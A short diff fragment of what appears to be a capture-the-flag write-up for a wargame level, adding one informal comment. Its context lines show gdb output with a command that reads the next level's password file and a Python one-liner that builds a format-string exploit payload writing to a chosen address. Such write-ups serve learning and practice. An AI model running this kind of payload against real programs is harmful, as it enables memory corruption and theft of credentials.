@@ -32,6 +32,7 @@ p 0x1025544 - 4 = 16930112
 (gdb) x/s 0x8048590
 0x8048590:	 "/bin/cat /home/user/level5/.pass"
 ```
+u dont need to let the buffer open
 
 ```
 python -c 'print "\x08\x04\x98\x10"[::-1] + "%16930112d" + "%12$n"' | ./level4 
